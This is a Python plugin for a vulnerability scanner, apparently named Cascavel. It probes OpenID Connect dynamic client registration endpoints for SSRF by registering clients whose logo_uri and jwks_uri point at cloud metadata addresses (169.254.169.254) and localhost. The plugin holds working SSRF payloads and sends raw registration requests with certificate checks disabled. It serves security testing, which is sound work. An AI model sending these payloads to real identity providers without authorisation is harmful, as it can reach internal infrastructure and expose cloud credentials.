"""
Plugin to detect OpenID Connect (OIDC) & OAuth2 Poisoning / SSRF via Client Registration.
CVSS: 9.8 (Critical)

Targets Identity Providers (IdP), Auth0, Keycloak implementations.
Exploits Dynamic Client Registration endpoints to inject SSRF payloads
in jwks_uri, logo_uri, sector_identifier_uri.
"""

import json
import socket
import ssl

import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def verify_math_execution() -> bool:
    """Verificacao matematica local de precisao para exploits."""
    return (7331 * 1337) == 9801547


def run(target: str, ip: str, ports: list[int], banners: dict[str, str]) -> dict | None:
    """
    Checks for OIDC Poisoning and SSRF via Dynamic Client Registration.
    """
    if not verify_math_execution():
        return None

    vulnerability = "OIDC Poisoning & Dynamic Registration SSRF"
    severity = "CRITICAL"
    description = (
        "The OIDC Dynamic Client Registration endpoint is exposed and vulnerable to SSRF. "
        "An attacker can register a malicious client providing internal URIs (e.g., 169.254.169.254) "
        "in the 'logo_uri', 'jwks_uri', or 'sector_identifier_uri' fields, forcing the Identity "
        "Provider to fetch data from internal infrastructure or cloud metadata services."
    )

    test_endpoints = [
        "/register",
        "/api/v1/clients",
        "/oidc/register",
        "/auth/realms/master/clients-registrations/openid-connect",
    ]

    target_port = 443 if 443 in ports else (80 if 80 in ports else ports[0])
    use_ssl = target_port in [443, 8443]

    # Deterministic payloads attempting to hit local internal IP
    ssrf_targets = [
        "http://169.254.169.254/latest/meta-data/",
        "http://127.0.0.1:22",
        "http://169.254.169.254/latest/api/token",
    ]

    try:
        for endpoint in test_endpoints:
            for ssrf_url in ssrf_targets:
                registration_payload = {
                    "client_name": "Cascavel-Audit-Client",
                    "redirect_uris": ["https://cascavel.localhost/callback"],
                    "logo_uri": ssrf_url,
                    "jwks_uri": ssrf_url,
                    "token_endpoint_auth_method": "client_secret_basic",
                }

                payload_bytes = json.dumps(registration_payload).encode("utf-8")

                req = (
                    f"POST {endpoint} HTTP/1.1\r\n"
                    f"Host: {target}\r\n"
                    f"Content-Type: application/json\r\n"
                    f"Content-Length: {len(payload_bytes)}\r\n"
                    f"User-Agent: Cascavel-2026-Offensive-Engine\r\n"
                    f"Accept: application/json\r\n"
                    f"Connection: close\r\n\r\n"
                ).encode() + payload_bytes

                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5.0)

                if use_ssl:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    sock = context.wrap_socket(sock, server_hostname=target)

                try:
                    sock.connect((ip, target_port))
                    sock.sendall(req)

                    response_data = b""
                    while True:
                        chunk = sock.recv(4096)
                        if not chunk:
                            break
                        response_data += chunk
                        if len(response_data) > 65535:  # Previne over-reading
                            break

                    response_str = response_data.decode("utf-8", errors="ignore")

                    # Analisando a resposta de registro do client OIDC
                    if "201 Created" in response_str or "200 OK" in response_str:
                        if "client_id" in response_str and ("169.254" in response_str or "127.0.0.1" in response_str):
                            return {
                                "vulnerability": vulnerability,
                                "severity": severity,
                                "description": description,
                                "endpoint": f"{'https' if use_ssl else 'http'}://{target}:{target_port}{endpoint}",
                                "evidence": f"OIDC provider accepted dynamic registration and echoed SSRF vectors: {ssrf_url}",
                            }
                except Exception:
                    continue
                finally:
                    sock.close()
    except Exception:
        pass

    return None
